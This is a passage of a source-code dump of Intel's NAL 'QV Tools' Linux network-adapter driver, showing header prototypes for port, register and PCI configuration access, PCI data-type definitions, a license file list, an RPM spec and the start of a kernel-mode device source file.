    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN PORT_ADDR Port
    );

UINT16
_NalReadPortOs16(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN PORT_ADDR Port
    );

UINT32
_NalReadPortOs32(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN PORT_ADDR Port
    );

BOOLEAN
_NalWritePortOs8(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN PORT_ADDR Port,
    IN UINT8 Value
    );

BOOLEAN
_NalWritePortOs16(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN PORT_ADDR Port,
    IN UINT16 Value
    );

BOOLEAN
_NalWritePortOs32(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN PORT_ADDR Port,
    IN UINT32 Value
    );

UINT8
_NalReadRegisterOs8(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address
    );

UINT16
_NalReadRegisterOs16(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address
    );

UINT32
_NalReadRegisterOs32(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address
    );

BOOLEAN
_NalWriteRegisterOs8(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address,
    IN UINT8 Value
    );

BOOLEAN
_NalWriteRegisterOs16(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address,
    IN UINT16 Value
    );

BOOLEAN
_NalWriteRegisterOs32(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address,
    IN UINT32 Value
    );

KVOID*
_NalAllocateMemoryNonPagedOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN UINT32 AllocationAmount,
    IN UINT32 Alignment,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress
    );

VOID
_NalFreeMemoryNonPagedOs(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN KVOID* Address
    );

BOOLEAN
_NalMarkAdapterInUse(
    IN NAL_ADAPTER_STRUCTURE* NalAdapter,
    IN NAL_DEVICE_LOCATION NalDevice,
    IN BOOLEAN Lock
    );

BOOLEAN
_NalIsDriverlessModeOs(
    VOID
    );

#endif

#if defined(NAL_EFI)
#include <efi\efidevice_i.h>

#elif defined(NAL_LINUX)
#if defined(NAL_DRIVER)
#include <linux/linuxdriverdevice_i.h>
#else
#include <linux/linuxdevice_i.h>
#endif

#elif defined(NAL_SOLARIS)
#if defined(NAL_DRIVER)
#include <solaris/solarisdriverdevice_i.h>
#else
#include <solaris/solarisdevice_i.h>
#endif

#elif defined(NAL_DOS)
#include <dos\dosdevice_i.h>

#elif defined(NAL_WINNT_WDM)
#if defined(NAL_DRIVER)
#include <winnt_wdm\windriverdevice_i.h>
#else
#include <winnt_wdm\windevice_i.h>
#endif

#elif defined(NAL_WINNT4)
#if defined(NAL_DRIVER)
#include <winnt4\windriverdevice_i.h>
#else
#include <winnt4\windevice_i.h>
#endif

#else

#error "Undefined NAL Operating System in osdevice_i.h."
#endif

typedef struct _NAL_OS_DEVICE
{
    NAL_MAC_TYPE MacType;
    NAL_DEVICE_LOCATION DeviceLocation;
    NAL_PHYSICAL_ADDRESS PhysicalAddress;
    KVOID* VirtualAddress;
    PORT_ADDR PortAddress;
    BOOLEAN IsDriverLoaded;
    BOOLEAN HasInterruptOccurred;

    NAL_OS_SPECIFIC_DEVICE OsSpecificDevice;

} NAL_OS_DEVICE;

#endif

```

`source/IntelNal/inc/pci_i.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   pci_i.h
 *
 *   Abstract:
 *     This file contains the NAL PCI interface generic prototypes.
 *     These prototypes are exposed externally.
 *
 */


#ifndef _PCIINTERFACE_H_
#define _PCIINTERFACE_H_

#include <naltypes.h>
#include <nalcodes.h>
#include <hwbus_t.h>

#if defined(NAL_EFI)
#include <efi\efipci_i.h>

#elif defined(NAL_LINUX)
#include <linux/linuxpci_i.h>

#elif defined(NAL_LINUX_USERMODE)
#include <linux/linuxpci_i.h>

#elif defined(NAL_SOLARIS)
#include <solaris/solarispci_i.h>

#elif defined(NAL_DOS)
#include <dos\dospci_i.h>

#elif defined(NAL_WINNT_WDM)
#include <winnt_wdm\winpci_i.h>

#elif defined(NAL_WINNT4)
#include <winnt4\winpci_i.h>

#else

#error "Undefined NAL Operating System in pci_i.h."
#endif

#define PCI_CONFIG_CAPABILITIES_POINTER 0x34

NAL_STATUS
NalScanPciBus(
    OUT NAL_DEVICE_LOCATION* PciLocations,
    IN OUT UINT32* Count
    );

NAL_STATUS
NalGetPciDeviceInformation(
    IN NAL_DEVICE_LOCATION PciLocation,
    OUT PCI_DEVICE* Device,
    IN UINT32 DwordCount
    );

NAL_STATUS
NalReadPciConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordIndex,
    OUT UINT32* Value
    );

NAL_STATUS
NalReadPciConfigVariable(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordIndex,
    IN UINT8 ByteMask,
    OUT UINT32* Value
    );

NAL_STATUS
NalWritePciConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordIndex,
    IN UINT32 Data
    );

NAL_STATUS
NalWritePciConfigVariable(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordIndex,
    IN UINT8 ByteMask,
    IN UINT32 Data
    );

NAL_STATUS
_NalWritePciConfig16(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 ByteOffset,
    IN UINT16 Value
    );

BOOLEAN
NalIsPcixAdapter(
    IN NAL_DEVICE_LOCATION* PciLocation OPTIONAL,
    IN PCI_DEVICE* Device OPTIONAL
    );

NAL_STATUS
NalIsPciExAdapter(
    IN NAL_DEVICE_LOCATION* PciLocation,
    IN PCI_DEVICE* Device
    );

VOID*
NalFindPciCapability(
    IN PCI_DEVICE* Device,
    IN UINT8 CapabilityId,
    OUT UINT32* ByteIndex
    );

BOOLEAN
NalHasPciCapability(
    IN NAL_DEVICE_LOCATION* DeviceLocation,
    IN NAL_PCI_CAPABILITY Capability,
    OUT UINT32* ByteIndex
    );

NAL_STATUS
NalGetPciMaxFunction(
    IN NAL_DEVICE_LOCATION* DeviceLocation,
    OUT UINT32* MaxFunction
    );

#endif

```

`source/IntelNal/inc/pci_t.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   pci_t.h
 *
 * Abstract:
 *   This file contains NAL PCI data types,
 *
 */


#ifndef _PCITYPES_H_
#define _PCITYPES_H_

#include "naltypes.h"

typedef enum _NAL_PCI_CAPABILITY
{
    NAL_VPD_CAPABILITY_ID = 0x03,
    NAL_SLOT_ID_CAPABILITY_ID = 0x04,
    NAL_MSI_CAPABILITY_ID = 0x05,
    NAL_HOTSWAP_CAPABILITY_ID = 0x06,
    NAL_PCIX_CAPABILITY_ID = 0x07,
    NAL_PCIEXPRESS_CAPABILITY_ID = 0x10,
    NAL_MSI_X_CAPABILITY_ID = 0x11
} NAL_PCI_CAPABILITY;

#define PCI_CONFIG_BM_VALID_BITS 0x0F
#define PCI_CONFIG_BM_BYTE1 0x01
#define PCI_CONFIG_BM_BYTE2 0x02
#define PCI_CONFIG_BM_BYTE3 0x04
#define PCI_CONFIG_BM_BYTE4 0x08
#define PCI_CONFIG_BM_ENTIRE_DWORD 0xF
#define PCI_CONFIG_BM_DWORD 0xF
#define PCI_CONFIG_BM_HIWORD 0xC
#define PCI_CONFIG_BM_LOWORD 0x3

#define PCI_DEVICE_ALL_DWORDS 64
#define PCI_DEVICE_CONFIG_DWORDS 16

#define PCI_EXPRESS_DEVICE_ALL_DWORDS 1024
#define PCI_EXPRESS_DEVICE_ALL_BYTES 4096
#define MAX_PCIEXP_SLOTS 32

#define PCI_MULTI_FUNCTION 0x00800000

#define PCI_BAR_IO_MASK 0x00000001
#define PCI_BAR_IO_MODE 0x00000001

#define PCI_BAR_MEM_MASK 0x0000000F
#define PCI_BAR_MEM_MODE 0x00000000
#define PCI_BAR_MEM_64BIT_MASK 0x00000006
#define PCI_BAR_MEM_64BIT 0x00000004
#define PCI_BAR_MEM_PREFETCHABLE 0x00000008

#define PCI_EXP_BAR_DWORD 12
#define PCI_EXP_BAR_ADDR_DECODE_ENA 0x00000001

#define PCI_CMD_IO_SPACE 0x00000001
#define PCI_CMD_MEM_SPACE 0x00000002
#define PCI_CMD_BUSMASTER 0x00000004

#define PCI_CAP 0xCF8
#define PCI_CDP 0xCFC
#define PCI_MAX_BUSES 256
#define PCI_MAX_DEVICES 32
#define PCI_MAX_FUNCTIONS 8

#define PCI_CAPABILITIES_LIST 0x0010

#pragma pack(1)

typedef struct _PCI_CONFIG_SPACE
{
    union {
        UINT32 Dwords[64];
        UINT8 Bytes[256];
    };

} PCI_CONFIG_SPACE;

typedef struct _PCI_EXPRESS_CONFIG_SPACE
{
    union {
        UINT32 Dwords[PCI_EXPRESS_DEVICE_ALL_DWORDS];
        UINT8 Bytes[PCI_EXPRESS_DEVICE_ALL_BYTES];
    };

} PCI_EXPRESS_CONFIG_SPACE;

typedef struct _PCI_DEVICE
{
#if defined (NAL_BIG_ENDIAN)
    UINT16 DeviceId;
    UINT16 VendorId;
    UINT16 StatusRegister;
    UINT16 CommandRegister;
    UINT8 ClassCode;
    UINT8 SubclassCode;
    UINT8 ProgIf;
    UINT8 RevisionId;
    UINT8 Bist;
    UINT8 HeaderType;
    UINT8 LatencyTimer;
    UINT8 CacheLineSize;
    UINT32 Bar0;
    UINT32 Bar1;
    UINT32 Bar2;
    UINT32 Bar3;
    UINT32 Bar4;
    UINT32 Bar5;
    UINT32 CardBusCisPointer;
    UINT16 SubsystemId;
    UINT16 SubsystemVendorId;
    UINT32 ExpansionRomBaseAddress;
    UINT8 Reserved[3];
    UINT8 CapabilitiesPointer;
    UINT32 Reserved2;
    UINT8 MaxLatency;
    UINT8 MinGrant;
    UINT8 InterruptPin;
    UINT8 InterruptLine;
#else
    UINT16 VendorId;
    UINT16 DeviceId;
    UINT16 CommandRegister;
    UINT16 StatusRegister;
    UINT8 RevisionId;
    UINT8 ProgIf;
    UINT8 SubclassCode;
    UINT8 ClassCode;
    UINT8 CacheLineSize;
    UINT8 LatencyTimer;
    UINT8 HeaderType;
    UINT8 Bist;
    UINT32 Bar0;
    UINT32 Bar1;
    UINT32 Bar2;
    UINT32 Bar3;
    UINT32 Bar4;
    UINT32 Bar5;
    UINT32 CardBusCisPointer;
    UINT16 SubsystemVendorId;
    UINT16 SubsystemId;
    UINT32 ExpansionRomBaseAddress;
    UINT8 CapabilitiesPointer;
    UINT8 Reserved[3];
    UINT32 Reserved2;
    UINT8 InterruptLine;
    UINT8 InterruptPin;
    UINT8 MinGrant;
    UINT8 MaxLatency;
#endif

    UINT32 ConfigSpace[48];
} PCI_DEVICE;

typedef union _PCI_SLOT_ID
{
    UINT32 SlotId;

    struct
    {
#if defined (NAL_BIG_ENDIAN)
        UINT32 Segment : 8;
        UINT32 Dword : 6;
        UINT32 _Byte : 2;
        UINT32 Device : 5;
        UINT32 Function : 3;
        UINT32 Bus : 8;
#else
        UINT32 Bus : 8;
        UINT32 Device : 5;
        UINT32 Function : 3;
        UINT32 Dword : 6;
        UINT32 _Byte : 2;
        UINT32 Segment : 8;
#endif
    };
} PCI_SLOT_ID;

typedef union _PCI_EXPRESS_SLOT_ID
{
    UINT32 SlotId;

    struct
    {
#if defined(NAL_BIG_ENDIAN)
        UINT32 Dword2 : 2;
        UINT32 _Byte : 2;
        UINT32 Reserved : 4;
        UINT32 Dword1 : 8;
        UINT32 Device : 5;
        UINT32 Function : 3;
        UINT32 Bus : 8;
#else
        UINT32 Bus : 8;
        UINT32 Device : 5;
        UINT32 Function : 3;
        UINT32 Dword : 10;
        UINT32 _Byte : 2;
        UINT32 Reserved : 4;
#endif
    };

} PCI_EXPRESS_SLOT_ID;

typedef struct _PCI_COMMAND_REGISTER_STRUCT
{
#if defined(NAL_BIG_ENDIAN)
    UINT16 SerrEnable : 1;
    UINT16 FastBackToBackEnable : 1;
    UINT16 Reserved : 6;
    UINT16 IoSpace : 1;
    UINT16 MemorySpace : 1;
    UINT16 BusMaster : 1;
    UINT16 SpecialCycles : 1;
    UINT16 WmiEnable : 1;
    UINT16 VgaPaletteSnoopEnable : 1;
    UINT16 ParityErrorResponce : 1;
    UINT16 SteppingControl : 1;
#else
    UINT16 IoSpace : 1;
    UINT16 MemorySpace : 1;
    UINT16 BusMaster : 1;
    UINT16 SpecialCycles : 1;
    UINT16 WmiEnable : 1;
    UINT16 VgaPaletteSnoopEnable : 1;
    UINT16 ParityErrorResponce : 1;
    UINT16 SteppingControl : 1;
    UINT16 SerrEnable : 1;
    UINT16 FastBackToBackEnable : 1;
    UINT16 Reserved : 6;
#endif
} PCI_COMMAND_REGISTER_STRUCT;

typedef struct _PCI_STATUS_REGISTER_STRUCT
{
#if defined(NAL_BIG_ENDIAN)
    UINT16 MasterDataParityError : 1;
    UINT16 DevselTiming : 2;
    UINT16 SignalledTargetAbort : 1;
    UINT16 ReceivedTargetAbort : 1;
    UINT16 ReceivedMasterAbort : 1;
    UINT16 SignalledSystemError : 1;
    UINT16 DetectedParityError : 1;
    UINT16 Reserved : 4;
    UINT16 CapabilitiesList : 1;
    UINT16 Capable66Mhz : 1;
    UINT16 ReservedUdfSupport : 1;
    UINT16 FastBackToBack : 1;
#else
    UINT16 Reserved : 4;
    UINT16 CapabilitiesList : 1;
    UINT16 Capable66Mhz : 1;
    UINT16 ReservedUdfSupport : 1;
    UINT16 FastBackToBack : 1;
    UINT16 MasterDataParityError : 1;
    UINT16 DevselTiming : 2;
    UINT16 SignalledTargetAbort : 1;
    UINT16 ReceivedTargetAbort : 1;
    UINT16 ReceivedMasterAbort : 1;
    UINT16 SignalledSystemError : 1;
    UINT16 DetectedParityError : 1;
#endif
} PCI_STATUS_REGISTER_STRUCT;

typedef struct _PCIX_DEVICE
{
#if defined (NAL_BIG_ENDIAN)
    UINT16 DeviceId;
    UINT16 VendorId;
    UINT16 StatusRegister;
    UINT16 CommandRegister;
    UINT8 ClassCode;
    UINT8 SubclassCode;
    UINT8 ProgIf;
    UINT8 RevisionId;
    UINT8 Bist;
    UINT8 HeaderType;
    UINT8 LatencyTimer;
    UINT8 CacheLineSize;
    UINT64 Bar0;
    UINT64 Bar1;
    UINT64 Bar2;
    UINT32 CardBusCisPointer;
    UINT16 SubsystemId;
    UINT16 SubsystemVendorId;
    UINT32 ExpansionRomBaseAddress;
    UINT8 Reserved[3];
    UINT8 CapabilitiesPointer;
    UINT32 Reserved2;
    UINT8 MaxLatency;
    UINT8 MinGrant;
    UINT8 InterruptPin;
    UINT8 InterruptLine;

    UINT32 ConfigSpace[48];
#else
    UINT16 VendorId;
    UINT16 DeviceId;
    UINT16 CommandRegister;
    UINT16 StatusRegister;
    UINT8 RevisionId;
    UINT8 ProgIf;
    UINT8 SubclassCode;
    UINT8 ClassCode;
    UINT8 CacheLineSize;
    UINT8 LatencyTimer;
    UINT8 HeaderType;
    UINT8 Bist;
    UINT64 Bar0;
    UINT64 Bar1;
    UINT64 Bar2;
    UINT32 CardBusCisPointer;
    UINT16 SubsystemVendorId;
    UINT16 SubsystemId;
    UINT32 ExpansionRomBaseAddress;
    UINT8 CapabilitiesPointer;
    UINT8 Reserved[3];
    UINT32 Reserved2;
    UINT8 InterruptLine;
    UINT8 InterruptPin;
    UINT8 MinGrant;
    UINT8 MaxLatency;

    UINT32 ConfigSpace[48];
#endif
} PCIX_DEVICE;

typedef struct _PCIX_COMMAND_REGISTER_STRUCT
{
#if defined(NAL_BIG_ENDIAN)
    UINT16 ReservedHi : 8;
    UINT16 DataParityErrorRecoverEnable : 1;
    UINT16 EnableRelaxedOrdering : 1;
    UINT16 MaxMemoryReadByteCount : 2;
    UINT16 MaxOutstandingSplitTransactions : 3;
    UINT16 ReservedLo : 1;
#else
    UINT16 DataParityErrorRecoverEnable : 1;
    UINT16 EnableRelaxedOrdering : 1;
    UINT16 MaxMemoryReadByteCount : 2;
    UINT16 MaxOutstandingSplitTransactions : 3;
    UINT16 Reserved : 9;
#endif
} PCIX_COMMAND_REGISTER_STRUCT;

typedef struct _PCIX_STATUS_REGISTER_STRUCT
{
#if defined(NAL_BIG_ENDIAN)
    UINT32 MaxOutstandingSplitTransactionsHi : 2;
    UINT32 MaxCumulativeReadSize : 3;
    UINT32 ReceivedSplitCompletionError : 1;
    UINT32 Reserved : 2;
    UINT32 Device64bit : 1;
    UINT32 Capable133Mhz : 1;
    UINT32 SplitCompletionDiscarded : 1;
    UINT32 UnexpectedSplitCompletion : 1;
    UINT32 DeviceComplexity : 1;
    UINT32 MaxMemoryReadByteCount : 2;
    UINT32 MaxOutstandingSplitTransactionsLo : 1;
    UINT32 BusNumber : 8;
    UINT32 FunctionNumber : 3;
    UINT32 DeviceNumber : 5;
#else
    UINT32 FunctionNumber : 3;
    UINT32 DeviceNumber : 5;
    UINT32 BusNumber : 8;
    UINT32 Device64bit : 1;
    UINT32 Capable133Mhz : 1;
    UINT32 SplitCompletionDiscarded : 1;
    UINT32 UnexpectedSplitCompletion : 1;
    UINT32 DeviceComplexity : 1;
    UINT32 MaxMemoryReadByteCount : 2;
    UINT32 MaxOutstandingSplitTransactions : 3;
    UINT32 MaxCumulativeReadSize : 3;
    UINT32 ReceivedSplitCompletionError : 1;
    UINT32 Reserved : 2;
#endif
} PCIX_STATUS_REGISTER_STRUCT;

typedef struct _CAPABILITY_REGISTER_SET_STRUCT
{
    UINT8 CapabilityId;
    UINT8 NextCapability;
    PCIX_COMMAND_REGISTER_STRUCT CommandRegister;
    PCIX_STATUS_REGISTER_STRUCT StatusRegister;
} CAPABILITY_REGISTER_SET_STRUCT;

#pragma pack()
#endif

```

`source/IntelNal/src/files.txt`:

```txt
This file describes in details which file in this folder is released under which license.
Full content of lincese is placed below the files' list.

iqvlinux.spec			- GPLv2
linuxdricerdevice_i.c		- GPLv2
linuxdriveros_i.c		- GPLv2
linuxdriverpci_i.c		- GPLv2
lunuxnaldriver.c		- GPLv2
Makefile			- GPLv2
nalinstall			- GPLv2
naliocrldrv.c			- BSD/GPLv2

  GPL LICENSE SUMMARY
  -------------------

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE
  -----------

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`source/IntelNal/src/iqvlinux.spec`:

```spec
Summary: QV Tools driver
Name: iqvlinux
Version: 1.1.4.5
Release: 0
BuildArch: noarch
License: GPL
Vendor: Intel
Group: System Environment/Kernel
URL: http://www.intel.com

Source: iqvlinux.tar.gz
BuildRoot: %{_tmppath}/%{name}-%{version}-root


%description
Network adapter driver for QV Tools.

%prep
%setup -c %{name} -n %{name}

%build

%install
if [ -d %{buildroot} ]; then
    rm -fr %{buildroot}
fi
mkdir -p %{buildroot}/%{_datadir}/%{name}-%{version}-root
make -f Makefile -C src/linux/driver \
     NALDIR=/usr/src/redhat/BUILD/%{name} \
     DESTDIR=%{buildroot}/%{_datadir}/%{name}-%{version}-root installrpm

%post
# V=1 if you want verbose output
make -f Makefile -C %{_datadir}/%{name}-%{version}-root/src/linux/driver \
     NALDIR=%{_datadir}/%{name}-%{version}-root/
%{_datadir}/%{name}-%{version}-root/src/linux/driver/nalinstall %{_datadir}/%{name}-%{version}-root/src/linux/driver
rm -fr %{_datadir}/%{name}-%{version}-root/*

%verifyscript
if [ ! -e /lib/modules/`uname -r`/kernel/drivers/net/iqvlinux.ko ]
then
	echo "QV Linux Driver is missing"
	exit 1
fi

%clean
rm -fr %{buildroot}

%files
%defattr(-, root, root, 0755)
%{_datadir}/%{name}-%{version}-root/

%changelog
* %(date "+%a %b %d %Y") %name %{version}
- Automatic build.

```

`source/IntelNal/src/linuxdriverdevice_i.c`:

```c
/*
 * Intel QV Linux kernel driver
 * Copyright (c) 1999 - 2013, Intel Corporation.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
 *
 */

/*
 *  Module Name:
 *    linuxdriverdevice_i.c
 *
 *  Abstract:
 *    This file contains implementation for any functions that are
 *    called from nalioctldrv.c and need to be run in kernel mode.
 *
 */


#include <nalcodes.h>
#include <naltypes.h>
#include "nalioctl.h"
#include <osdevice_i.h>
#include <os_i.h>
#include "linuxnaldriver.h"
#include "linuxpci_i.h"
#include <linux/sched.h>
#include <asm/io.h>
#include <linux/pci.h>

#ifndef DMA_BIT_MASK
#define DMA_BIT_MASK(n) (((n) == 64) ? ~0ULL : ((1ULL<<(n))-1))
#endif

BOOLEAN
_NalCheckAndClearAdapterInterrupt(
    IN NAL_MAC_TYPE MacType,
    IN KVOID* BaseAddress
    );

void
_NalServiceRoutine(
    IN int Irq,
    IN void* Context,
    IN struct pt_regs* Regs
    );

NAL_STATUS
_NalEnableDevice(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    OUT NAL_IO_RESOURCE* IoResource,
    OUT KVOID** Pdev
    );

NAL_STATUS
_NalFillDeviceResource(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    OUT NAL_IO_RESOURCE* IoResource,
    OUT KVOID** Pdev
    );

NAL_STATUS
_NalReleaseRegions(
    IN KVOID* PDev
    );

NAL_OS_RUN_DOMAIN
_NalGetOsRunDomain( void );

void
_NalServiceRoutine(
    IN int Irq,
    IN void* Context,
    IN struct pt_regs* Regs
    )
{
    NAL_LINUX_ISR_DEVICE* NalIsrDevice = (NAL_LINUX_ISR_DEVICE*)Context;

    if(NalIsrDevice != NULL)
    {

        NalIsrDevice->DeviceInterrupted =
            _NalCheckAndClearAdapterInterrupt((NAL_MAC_TYPE)NalIsrDevice->MacType,
                                              NalIsrDevice->HardwareVirtualAddress);
    }
}

NAL_STATUS
_NalInitializeInterrupts(
    IN NAL_LINUX_ISR_DEVICE* NalIsrDevice
    )
{
    return NAL_NOT_IMPLEMENTED;
}

NAL_STATUS
_NalUninitializeInterrupts(
    IN NAL_LINUX_ISR_DEVICE* NalIsrDevice
    )
{
    return NAL_NOT_IMPLEMENTED;
}

BOOLEAN
_NalHasInterruptOccurred(
